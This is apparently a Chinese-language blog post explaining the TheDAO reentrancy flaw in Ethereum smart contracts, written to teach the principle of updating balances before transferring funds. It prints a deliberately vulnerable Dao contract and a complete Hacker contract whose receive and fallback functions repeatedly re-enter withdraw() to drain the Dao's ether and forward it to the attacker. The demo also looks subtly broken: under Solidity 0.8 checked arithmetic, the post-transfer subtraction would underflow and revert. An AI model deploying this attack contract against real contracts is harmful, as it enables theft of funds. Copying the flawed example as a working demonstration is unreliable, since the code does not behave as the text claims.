---
title: tho dao 合约漏洞
date: 2024-07-30 13:43:23
author: ivhu
categories:
  - 区块链
  - 以太坊
tags:
  - 合约安全
  - solidity
description: 这篇博客分析了TheDAO漏洞的机制，阐明了如何利用Solidity合约的特性进行攻击，具体展示了黑客合约如何通过重入攻击提取TheDAO合约中存储的以太坊，强调了在合约中处理资金转账和状态更新时需要遵循的安全原则。
---

> 这篇博客分析了TheDAO漏洞的机制，阐明了如何利用Solidity合约的特性进行攻击，具体展示了黑客合约如何通过重入攻击提取TheDAO合约中存储的以太坊，强调了在合约中处理资金转账和状态更新时需要遵循的安全原则。

## 什么是 TheDao 漏洞？

简单来讲，thedao 漏洞允许黑客将 thedao 合约中储存的 eth 全部取走。

那么什么是合约之中的 eth 呢？

solidity 允许合约定义 payable 方法来接受 eth. 当用户调用带有 payable 关键字的合约方法时，如果`msg.value`不为 0,则将`msg.value`转移到合约账下。

由于 thedao 是一个面对所有人的合约，而他的业务逻辑也需要用户将 eth 转移到他的合约里面。

那么正常情况下 thedao 合约中有大量的 eth,来自于不同人的转账，一般而言合约会使用一个 mapping 来记录每个地址有多要 eth 在这里面。

## solidity 特性

如果我们向一个合约转账，这里的转账不是使用合约调用的方式，而是像普通转账一样，calldata 为空。

这时合约会自动调用 receive 方法（如果有的话），这将允许合约在收到转账后进行一些操作。

### 什么是先转账后记账

在合约中我们可以使用 transfer,send 等方法将合约中一定数量的 eth 转移到对应的账户中，当然这里的转账对象也可以是另一个合约。

而记账的意思是，由于我们所有的 eth 都是放合约里面，没有区分那个 eth 是谁的，具体的记录一般在合约中用 mapping 记录，那么在合约中，每次我们进行转账时，都应该修改我们维护的账本（也就是那个 mapping）。先转账后记账的意思就是，先使用 transfor,send,call 等方法转账，而后更新 mapping 中的数据。在合约中表现为转账的操作在修改 mapping 的操作前面。

eg：

```solidity
    (bool sent, ) = msg.sender.call{value: bal}("");  // 先转账
    require(sent, "Failed to withdraw sender's balance");

    // Update user's balance.
    balances[msg.sender] = balances[msg.sender] - bal;  // 后修改mapping中的数据

```

那么回到 solidity 的特性，在转账时，接受者合约可以定义`recevie`方法，在转账发生时进行相关操作。

## 漏洞的利用

- 当我们调用 theDao 中转账函数时，合约会向`msg.sender`转账.

- `msg.sender`是黑客的合约，当 theDao 向黑客的合约转账时，会调用黑客合约中的 recevie 方法.

- 由于 evm 是单线程的，所以后面修改 mapping 的操作还不会进行，而黑客的 recevie 方法则再次调用 thedao 中的转账合约.

- 由于 thedao 合约还没有修改账本，所以 thedao 合约还是认为黑客合约还可以提款，而当进行到提款操作时又会进入到黑客合约的`recevie`方法.

如此循环，直到达到黑客`recevie`中设置的阈值。

**案例合约：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract Dao {
mapping(address => uint256) public balances;

    function deposit() public payable {
        require(msg.value >= 1 ether, "Deposits must be no less than 1 Ether");
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Check user's balance
        require(
            balances[msg.sender] >= 1 ether,
            "Insufficient funds.  Cannot withdraw"
        );
        uint256 bal = balances[msg.sender];

        // Withdraw user's balance
        // payable(msg.sender).transfer(bal);  // transfer只能向eoa发送交易
        (bool sent, ) = msg.sender.call{value: bal}("");  // call  eoa和合约都可以发送
        require(sent, "Failed to withdraw sender's balance");

        // Update user's balance.
        balances[msg.sender] = balances[msg.sender] - bal;
        require(balances[msg.sender]>=0,"balances < 0");
    }

    function daoBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
```

**黑客合约：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IDao {
    function withdraw() external ;
    function deposit()external  payable;
 }

contract Hacker{
    IDao dao;
    address payable hacker;

    constructor(address _dao){
        dao = IDao(_dao);
        hacker = payable(msg.sender);
    }

    function attack() public payable {
        // Seed the Dao with at least 1 Ether.
        require(msg.value >= 1 ether, "Need at least 1 ether to commence attack.");
        dao.deposit{value: msg.value}();

        // Withdraw from Dao.
        dao.withdraw();
    }

    fallback() external payable{
        if(address(dao).balance >= 1 ether){
            dao.withdraw();
        }
    }
    receive() external payable {
        if(address(dao).balance >= 1 ether){
            dao.withdraw();
        }
    }

    function getBalance()public view returns (uint){
        return address(this).balance;
    }
    function getAllETH()public {
        hacker.transfer(address(this).balance);
    }
}
```
